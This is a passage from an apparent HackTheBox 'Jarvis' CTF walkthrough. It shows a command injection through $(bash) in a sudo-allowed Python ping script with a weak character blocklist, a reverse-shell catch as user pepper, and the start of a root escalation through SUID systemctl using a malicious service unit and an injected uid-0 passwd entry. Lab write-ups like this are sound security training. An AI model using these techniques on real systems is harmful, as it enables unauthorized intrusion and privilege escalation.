drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc
drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
www-data@jarvis:/home/pepper$ cat user.txt 
cat: user.txt: Permission denied
www-data@jarvis:/home/pepper$ 
</code></pre></div></div>
<p>By running <code class="language-plaintext highlighter-rouge">sudo -l</code> I saw that I can run <code class="language-plaintext highlighter-rouge">/var/www/Admin-Utilities/simpler.py</code> as <code class="language-plaintext highlighter-rouge">pepper</code> without a password:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/home/pepper$ sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/home/pepper$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************


********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    
www-data@jarvis:/home/pepper$ 
</code></pre></div></div>
<p>Let’s take a look at that script:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">jarvis</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pepper</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">Admin</span><span class="o">-</span><span class="n">Utilities</span><span class="o">/</span><span class="n">simpler</span><span class="p">.</span><span class="n">py</span>
<span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>             
<span class="kn">import</span> <span class="nn">sys</span>               
<span class="kn">import</span> <span class="nn">os</span> 
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">listdir</span>               
<span class="kn">import</span> <span class="nn">re</span>        
<span class="k">def</span> <span class="nf">show_help</span><span class="p">():</span>         
    <span class="n">message</span><span class="o">=</span><span class="s">'''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]
Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP                
    '''</span>     
    <span class="k">print</span><span class="p">(</span><span class="n">message</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">show_header</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
***********************************************                   
'''</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show_statistics</span><span class="p">():</span>
    <span class="n">path</span> <span class="o">=</span> <span class="s">'/home/pepper/Web/Logs/'</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Statistics</span><span class="se">\n</span><span class="s">-----------'</span><span class="p">)</span>
    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="n">count</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">listed_files</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Number of Attackers: '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">count</span><span class="p">))</span>
    <span class="n">level_1</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">reks</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">ip</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">req</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">rek</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
        <span class="n">level2</span><span class="p">,</span> <span class="n">rek</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="n">fecha</span><span class="p">,</span> <span class="n">requ</span> <span class="o">=</span> <span class="n">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
            <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
            <span class="n">req</span> <span class="o">=</span> <span class="n">requ</span>
            <span class="n">ip2</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span>
        <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span>
            <span class="n">level_1</span> <span class="o">=</span> <span class="n">level2</span>
            <span class="n">ip_list</span> <span class="o">=</span> <span class="p">[</span><span class="n">ip</span><span class="p">]</span>
            <span class="n">reks</span><span class="o">=</span><span class="p">[</span><span class="n">rek</span><span class="p">]</span>
        <span class="k">elif</span> <span class="nb">int</span><span class="p">(</span><span class="n">level2</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">level_1</span><span class="p">):</span>
            <span class="n">ip_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
            <span class="n">reks</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">rek</span><span class="p">)</span>
        <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="k">print</span><span class="p">(</span><span class="s">'Most Risky:'</span><span class="p">)</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">ip_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'More than 1 ip found'</span><span class="p">)</span>
    <span class="n">cont</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">ip_list</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">'    '</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">' - Attack Level : '</span> <span class="o">+</span> <span class="n">level_1</span> <span class="o">+</span> <span class="s">' Request: '</span> <span class="o">+</span> <span class="n">reks</span><span class="p">[</span><span class="n">cont</span><span class="p">])</span>
        <span class="n">cont</span> <span class="o">=</span> <span class="n">cont</span> <span class="o">+</span> <span class="mi">1</span>

    <span class="k">print</span><span class="p">(</span><span class="s">'Most Recent: '</span> <span class="o">+</span> <span class="n">ip2</span> <span class="o">+</span> <span class="s">' --&gt; '</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">req</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">list_ip</span><span class="p">():</span>
    <span class="k">print</span><span class="p">(</span><span class="s">'Attackers</span><span class="se">\n</span><span class="s">-----------'</span><span class="p">)</span>
    <span class="n">path</span> <span class="o">=</span> <span class="s">'/home/pepper/Web/Logs/'</span>
    <span class="n">listed_files</span> <span class="o">=</span> <span class="n">listdir</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">listed_files</span><span class="p">:</span>
        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span><span class="s">'r'</span><span class="p">)</span>
        <span class="n">lines</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
        <span class="n">level</span><span class="p">,</span><span class="n">req</span> <span class="o">=</span> <span class="n">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.'</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s">' - Attack Level : '</span> <span class="o">+</span> <span class="n">level</span><span class="p">)</span>                                                                             
        <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">date_to_num</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
    <span class="n">dat</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">ip</span> <span class="o">=</span> <span class="s">''</span>
    <span class="n">req</span><span class="o">=</span><span class="s">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">'Level'</span> <span class="ow">in</span> <span class="n">i</span><span class="p">:</span>
            <span class="n">fecha</span><span class="o">=</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">7</span><span class="p">]).</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">regex</span> <span class="o">=</span> <span class="s">'(\d+)-(.*)-(\d+)(.*)'</span>
            <span class="n">logEx</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="n">regex</span><span class="p">,</span> <span class="n">fecha</span><span class="p">).</span><span class="n">groups</span><span class="p">()</span>
            <span class="n">mes</span> <span class="o">=</span> <span class="n">to_dict</span><span class="p">(</span><span class="n">logEx</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
            <span class="n">fecha</span> <span class="o">=</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'-'</span> <span class="o">+</span> <span class="n">mes</span> <span class="o">+</span> <span class="s">'-'</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">logEx</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
            <span class="n">fecha</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">fecha</span><span class="p">,</span> <span class="s">'%Y-%m-%d %H:%M:%S'</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span>
                <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span>
                <span class="n">req</span> <span class="o">=</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">i</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">dat</span><span class="p">,</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">to_dict</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="n">month_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Jan'</span><span class="p">:</span><span class="s">'01'</span><span class="p">,</span><span class="s">'Feb'</span><span class="p">:</span><span class="s">'02'</span><span class="p">,</span><span class="s">'Mar'</span><span class="p">:</span><span class="s">'03'</span><span class="p">,</span><span class="s">'Apr'</span><span class="p">:</span><span class="s">'04'</span><span class="p">,</span> <span class="s">'May'</span><span class="p">:</span><span class="s">'05'</span><span class="p">,</span> <span class="s">'Jun'</span><span class="p">:</span><span class="s">'06'</span><span class="p">,</span><span class="s">'Jul'</span><span class="p">:</span><span class="s">'07'</span><span class="p">,</span><span class="s">'Aug'</span><span class="p">:</span><span class="s">'08'</span><span class="p">,</span><span class="s">'Sep'</span><span class="p">:</span><span class="s">'09'</span><span class="p">,</span><span class="s">'Oct'</span><span class="p">:</span><span class="s">'10'</span><span class="p">,</span><span class="s">'Nov'</span><span class="p">:</span><span class="s">'11'</span><span class="p">,</span><span class="s">'Dec'</span><span class="p">:</span><span class="s">'12'</span><span class="p">}</span>                                                          
    <span class="k">return</span> <span class="n">month_dict</span><span class="p">[</span><span class="n">name</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
    <span class="n">level</span><span class="o">=</span><span class="mi">0</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">'Level'</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span>
            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="p">):</span>
                <span class="n">level</span> <span class="o">=</span> <span class="n">j</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span>
                <span class="n">req</span><span class="o">=</span><span class="n">j</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">j</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s">' '</span> <span class="o">+</span> <span class="n">j</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">level</span><span class="p">,</span> <span class="n">req</span>

<span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s">'&amp;'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'||'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">]</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter an IP: '</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'Got you'</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">show_header</span><span class="p">()</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'-h'</span> <span class="ow">or</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'--help'</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'-s'</span><span class="p">:</span>
        <span class="n">show_statistics</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'-l'</span><span class="p">:</span>
        <span class="n">list_ip</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'-p'</span><span class="p">:</span>
        <span class="n">exec_ping</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">show_help</span><span class="p">()</span>
        <span class="nb">exit</span><span class="p">()</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">jarvis</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pepper</span><span class="err">$</span>
</code></pre></div></div>
<p>The most interesting function in this script is <code class="language-plaintext highlighter-rouge">exec_ping</code>:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span>
    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s">'&amp;'</span><span class="p">,</span> <span class="s">';'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'||'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">]</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'Enter an IP: '</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s">'Got you'</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping '</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span>
</code></pre></div></div>
<p>It takes our input (it assumes that it’s an ip) and executes <code class="language-plaintext highlighter-rouge">ping</code> on it, to prevent command injection it checks for these characters:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&amp; ; - ` || |
</code></pre></div></div>
<p>However, It doesn’t check for the dollar sign (<code class="language-plaintext highlighter-rouge">$</code>), the dollar sign can be used to execute commands like this: <code class="language-plaintext highlighter-rouge">$(command)</code>
<br>So for example if we do <code class="language-plaintext highlighter-rouge">ping -c 1 $(echo 127.0.0.1)</code>, <code class="language-plaintext highlighter-rouge">echo 127.0.0.1</code> will be executed first then the <code class="language-plaintext highlighter-rouge">ping</code> command will be executed:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis# ping -c 1 $(echo 127.0.0.1)
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
root@kali:~/Desktop/HTB/boxes/jarvis#
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">ping -c 1 $(whoami)</code> will result in an error message because it will try to ping <code class="language-plaintext highlighter-rouge">root</code> which is not a valid hostname:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis#  ping -c 1 $(whoami)
ping: unknown host root
root@kali:~/Desktop/HTB/boxes/jarvis# 
</code></pre></div></div>
<p>So we can simply do <code class="language-plaintext highlighter-rouge">$(bash)</code> and we’ll get a shell:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@jarvis:/home/pepper$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)
pepper@jarvis:~$ 
</code></pre></div></div>
<p>When I ran commands I didn’t get any output:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~$ id
pepper@jarvis:~$ cat user.txt 
pepper@jarvis:~$ ls -la
pepper@jarvis:~$ 
</code></pre></div></div>
<p>So I executed a reverse shell command (I used the same payload I used before) and got a reverse shell as <code class="language-plaintext highlighter-rouge">pepper</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/jarvis# nc -lvnp 1338
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::1338
Ncat: Listening on 0.0.0.0:1338
Ncat: Connection from 10.10.10.143.
Ncat: Connection from 10.10.10.143:40124.
$ python -c "import pty;pty.spawn('/bin/bash')"
pepper@jarvis:~$ ^Z
[1]+  Stopped                 nc -lvnp 1338
root@kali:~/Desktop/HTB/boxes/jarvis# stty raw -echo
root@kali:~/Desktop/HTB/boxes/jarvis# nc -lvnp 1338

pepper@jarvis:~$ export TERM=screen
pepper@jarvis:~$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:~$ ls -al
total 32
drwxr-xr-x 4 pepper pepper 4096 Mar  5  2019 .
drwxr-xr-x 3 root   root   4096 Mar  2  2019 ..
lrwxrwxrwx 1 root   root      9 Mar  4  2019 .bash_history -&gt; /dev/null
-rw-r--r-- 1 pepper pepper  220 Mar  2  2019 .bash_logout
-rw-r--r-- 1 pepper pepper 3526 Mar  2  2019 .bashrc
drwxr-xr-x 2 pepper pepper 4096 Mar  2  2019 .nano
-rw-r--r-- 1 pepper pepper  675 Mar  2  2019 .profile
drwxr-xr-x 3 pepper pepper 4096 Mar  4  2019 Web
-r--r----- 1 root   pepper   33 Mar  5  2019 user.txt
pepper@jarvis:~$
</code></pre></div></div>

<p><br><img src="/images/hackthebox/jarvis/17.png" alt="" class="align-center"><br><br></p>

<p>We owned user.<br></p>

<h2 id="systemctl-suid--root-shell--root-flag">Systemctl: suid –&gt; Root Shell –&gt; Root Flag</h2>
<p>When I checked the <code class="language-plaintext highlighter-rouge">suid</code> binaries I saw <code class="language-plaintext highlighter-rouge">systemctl</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pepper@jarvis:~$ find / -perm -4000 2&gt;/dev/null 
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
pepper@jarvis:~$ 
</code></pre></div></div>

<blockquote>
  <p>systemctl may be used to introspect and control the state of the “systemd” system and service manager. -<a href="http://man7.org/linux/man-pages/man1/systemctl.1.html" target="_blank" rel="noopener noreferrer">man7.org</a></p>
</blockquote>

<p>To verify that it can be abused I checked <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">gtfobins</a> and found a <a href="https://gtfobins.github.io/gtfobins/systemctl/" target="_blank" rel="noopener noreferrer">page</a> for it.<br>
We need to create a service that executes a file of our choice when it starts, then we’ll use <code class="language-plaintext highlighter-rouge">systemctl</code> to enable and start it and the file will get executed as root.<br>
I created a service that executes <code class="language-plaintext highlighter-rouge">/dev/shm/root.sh</code>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[Unit]
Description=pwned

[Service]
ExecStart=/dev/shm/root.sh

[Install]
WantedBy=multi-user.target
</code></pre></div></div>
<p>And I created <code class="language-plaintext highlighter-rouge">/dev/shm/root.sh</code> which echoes:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
</code></pre></div></div>
